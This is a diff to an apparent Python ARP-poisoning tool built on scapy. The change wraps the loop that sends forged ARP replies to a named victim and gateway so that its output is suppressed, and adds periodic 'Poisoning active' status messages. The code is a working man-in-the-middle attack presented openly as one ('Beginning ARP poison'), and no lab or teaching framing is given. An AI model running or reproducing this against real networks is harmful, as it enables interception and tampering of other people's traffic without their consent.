@@ -24,7 +24,7 @@ import scapy.all as scap
 from getmac import get_mac_address
 from signal import signal, SIGINT
 from termcolor import colored
-
+import contextlib
 
 def exitHandler(signal, frame):
 	'''
@@ -113,18 +113,22 @@ if __name__ == '__main__':
 		print(colored('[*] Beginning ARP poison, Ctrl+c to quit', 'yellow'))
 		print(' -- GATEWAY: ', gateway_ip)
 		print(' -- VICTIM: ', victim_ip)
-		while True:
-			# Telling the victim 'I am the router'
-			vic_packet = scap.ARP(op=1, pdst=victim_ip, hwsrc=attacker_mac, psrc=gateway_ip)
-			scap.send(vic_packet)
 
-			# Telling the router 'I am the victim'
-			router_packet = scap.ARP(op=1, pdst=gateway_ip, hwsrc=attacker_mac, psrc=victim_ip)
-			scap.send(router_packet)
-			'''			
+		i = 0
+		while True:
+			i = i + 1
+
+			with contextlib.redirect_stdout(None):	
+				# Telling the victim 'I am the router'
+				vic_packet = scap.ARP(op=1, pdst=victim_ip, hwsrc=attacker_mac, psrc=gateway_ip)
+				scap.send(vic_packet)
+
+				# Telling the router 'I am the victim'
+				router_packet = scap.ARP(op=1, pdst=gateway_ip, hwsrc=attacker_mac, psrc=victim_ip)
+				scap.send(router_packet)
+			
 			if i % 25 == 0:
 				print('[+] Poisoning active')
 				print(' |')
 				print(' |--> Gateway: ', gateway_ip)
 				print(' |--> Victim: ', victim_ip)
-			'''
